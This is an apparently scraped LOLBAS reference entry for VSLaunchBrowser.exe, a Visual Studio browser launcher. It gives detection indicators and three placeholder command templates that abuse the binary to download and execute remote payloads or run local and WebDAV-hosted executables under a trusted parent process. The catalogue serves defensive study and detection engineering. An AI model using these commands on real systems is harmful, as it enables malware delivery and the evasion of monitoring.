---
title: "VSLaunchBrowser.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/VsLaunchBrowser/
fetched_at: 2026-09-20T17:15:41Z
license: unspecified
category: windows
---

Microsoft Visual Studio browser launcher tool for web applications debugging

## Paths
- C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe
- C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe

## Acknowledgements
- Avihay Eldad ([@AvihayEldad](https://twitter.com/@AvihayEldad))

## Detections
- IOC: cmd.exe as sub-process of VSLaunchBrowser
- IOC: URL on a VSLaunchBrowser command line
- IOC: VSLaunchBrowser making unexpected network connections or DNS requests

## Download

1. Download and execute payload from remote server

```
VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
```

   - Use case: It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.

   - Privileges required: User

   - Operating systems: Windows

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache

2. Execute payload via VSLaunchBrowser as parent process

```
VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
```

   - Use case: It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.

   - Privileges required: User

   - Operating systems: Windows

   - ATT&CK® technique: T1127

   - Tags: Execute: EXE

3. Execute payload from WebDAV server via VSLaunchBrowser as parent process

```
VSLaunchBrowser.exe .exe {PATH_SMB}
```

   - Use case: It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.

   - Privileges required: User

   - Operating systems: Windows

   - ATT&CK® technique: T1127

   - Tags: Execute: EXEExecute: Remote
